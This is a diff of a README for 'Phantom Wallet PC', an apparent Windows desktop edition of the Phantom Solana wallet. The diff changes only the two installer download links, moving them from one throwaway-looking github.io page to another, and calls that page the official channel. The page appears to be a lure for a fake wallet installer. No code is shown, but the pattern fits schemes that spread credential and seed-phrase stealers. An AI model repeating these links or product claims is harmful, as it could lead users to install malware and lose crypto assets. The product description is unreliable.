@@ -2,7 +2,7 @@
 
 Phantom Wallet PC is a powerful desktop application designed to enhance your Phantom wallet experience on Windows. It provides advanced tools for managing Solana blockchain assets, including cryptocurrencies and NFTs, with a focus on security and usability. This full suite integrates seamlessly with the Phantom ecosystem, offering features that go beyond the browser extension for a robust desktop environment.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -64,6 +64,6 @@ A: Currently, it focuses on the Solana blockchain for optimal performance. Futur
 
 To get Phantom Wallet PC, please use the link below. This ensures you receive the latest and most secure version directly from our official channel.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 Phantom Wallet PC is a free tool for desktop users, and it is continuously improved based on community feedback. Last updated in 2026, it remains a reliable solution for managing your digital assets on Windows. If you find it useful, consider starring the repository to support ongoing development. Remember, always back up your wallet seed phrase and practice safe security habits when using cryptocurrency tools.
